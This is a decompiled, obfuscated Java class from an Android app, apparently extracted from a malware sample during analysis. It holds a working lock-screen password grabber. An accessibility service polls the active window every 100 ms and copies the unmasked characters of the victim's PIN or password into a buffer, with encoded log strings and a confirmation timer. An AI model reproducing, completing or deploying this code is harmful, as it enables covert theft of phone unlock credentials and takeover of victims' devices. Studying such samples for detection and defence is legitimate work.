package v.s;

import android.os.Handler;
import android.view.accessibility.AccessibilityNodeInfo;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.util.Timer;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class KOlCcQzLUe3LIFgQyuVD implements Runnable {
    public final /* synthetic */ Handler JXn4Qf7zpnLjP5;
    public boolean vekpFI4d1Nc4fakF;
    public int w9sT1Swbhx3hs;

    public KOlCcQzLUe3LIFgQyuVD(Handler handler) {
        this.JXn4Qf7zpnLjP5 = handler;
    }

    private static /* synthetic */ void ibpio() {
    }

    @Override // java.lang.Runnable
    public final void run() {
        String string;
        if (DataQFAdapter.passwordPollerActive) {
            DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
            if (dataQFAdapter == null) {
                DataQFAdapter.passwordPollerActive = false;
                return;
            }
            if (System.currentTimeMillis() - DataQFAdapter.lockPasswordTime > 30000) {
                DataQFAdapter.passwordPollerActive = false;
                DataQFAdapter.lockPasswordBuffer.setLength(0);
                String unused = DataQFAdapter.TAG;
                TypefaceCache.obtain("001300770048009400E700B000C000A3006300660054008B00FC00BA00C000E70037007F0056008200FF00AA00C600E7006B0025000B009400B9");
                return;
            }
            try {
                AccessibilityNodeInfo rootInActiveWindow = dataQFAdapter.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    GARjgaGEpTotOxcl8vfe gARjgaGEpTotOxcl8vfe = DataQFAdapter.Companion;
                    gARjgaGEpTotOxcl8vfe.getClass();
                    String strWotphlvK9sPbXJ = GARjgaGEpTotOxcl8vfe.wotphlvK9sPbXJ(rootInActiveWindow, 0);
                    CharSequence packageName = rootInActiveWindow.getPackageName();
                    if (packageName == null || (string = packageName.toString()) == null) {
                        string = "";
                    }
                    rootInActiveWindow.recycle();
                    if (strWotphlvK9sPbXJ == null || strWotphlvK9sPbXJ.length() <= 0) {
                        if (string.length() > 0 && !DataQFAdapter.lockScreenPackages.contains(string)) {
                            if (DataQFAdapter.lockPasswordBuffer.length() > 0) {
                                gARjgaGEpTotOxcl8vfe.ibVTtJUNfrGYbW();
                                return;
                            }
                            this.vekpFI4d1Nc4fakF = true;
                        }
                        this.w9sT1Swbhx3hs++;
                    } else {
                        for (int i = 0; i < strWotphlvK9sPbXJ.length(); i++) {
                            char cCharAt = strWotphlvK9sPbXJ.charAt(i);
                            if (cCharAt != 8226 && cCharAt != '*' && cCharAt != 9679) {
                                if (!strWotphlvK9sPbXJ.equals(DataQFAdapter.lockPasswordBuffer.toString())) {
                                    DataQFAdapter.lockPasswordBuffer.setLength(0);
                                    DataQFAdapter.lockPasswordBuffer.append(strWotphlvK9sPbXJ);
                                    DataQFAdapter.lockPasswordTime = System.currentTimeMillis();
                                    String unused2 = DataQFAdapter.TAG;
                                    TypefaceCache.obtain("001300770048009400E700B000C000A3006300700052008200FC00BB009200B30026006E004F00C700E500AF00D600A600370073005F00DD00B0");
                                    TypefaceCache.obtain("006300750053008600E200AC");
                                    Timer timer = DataQFAdapter.lockPasswordConfirmTimer;
                                    if (timer != null) {
                                        timer.cancel();
                                    }
                                    DataQFAdapter.lockPasswordConfirmTimer = new Timer();
                                    Timer timer2 = DataQFAdapter.lockPasswordConfirmTimer;
                                    if (timer2 == null) {
                                        break;
                                    }
                                    timer2.schedule(new HM4aGJXSNeHl1YeqJkL(2), 3000L);
                                    break;
                                }
                                break;
                            }
                        }
                        this.w9sT1Swbhx3hs = 0;
                        this.vekpFI4d1Nc4fakF = false;
                    }
                    if (this.vekpFI4d1Nc4fakF && this.w9sT1Swbhx3hs > 30) {
                        DataQFAdapter.passwordPollerActive = false;
                        DataQFAdapter.lockPasswordBuffer.setLength(0);
                        return;
                    } else if (this.w9sT1Swbhx3hs > 300) {
                        DataQFAdapter.passwordPollerActive = false;
                        DataQFAdapter.lockPasswordBuffer.setLength(0);
                        return;
                    }
                }
            } catch (Exception e) {
                String unused3 = DataQFAdapter.TAG;
                TypefaceCache.obtain("001300770048009400E700B000C000A3006300660054008B00FC00BA00C000E7002600640049008800E200E50092");
                e.getMessage();
            }
            if (DataQFAdapter.passwordPollerActive) {
                this.JXn4Qf7zpnLjP5.postDelayed(this, 100L);
            }
        }
    }
}
